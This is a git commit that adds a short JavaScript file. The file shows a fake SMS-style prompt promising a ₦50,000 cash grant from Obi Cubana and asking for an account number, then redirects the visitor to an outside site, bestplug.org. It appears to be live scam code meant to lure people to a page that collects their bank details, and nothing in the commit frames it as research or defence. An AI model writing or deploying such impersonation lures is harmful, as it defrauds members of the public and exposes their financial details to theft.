8c1d1dbc699c822840b30bbe5963a34f60f0b105
vibeblog <enom02567@gmail.com>
2025-04-13 07:24:57 +0100

    Create obi-active.js

---
+++ obi-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW CASH'
+password=prompt('SMS: Congratulations, you have been selected to receive ₦50,000 cash grant from Obi Cubana, Press Ok to submit account number Now ','WITHDRAW CASH');
+if (password != 'WITHDRAW CASH') {
+location.href='https://bestplug.org/obi';
+}
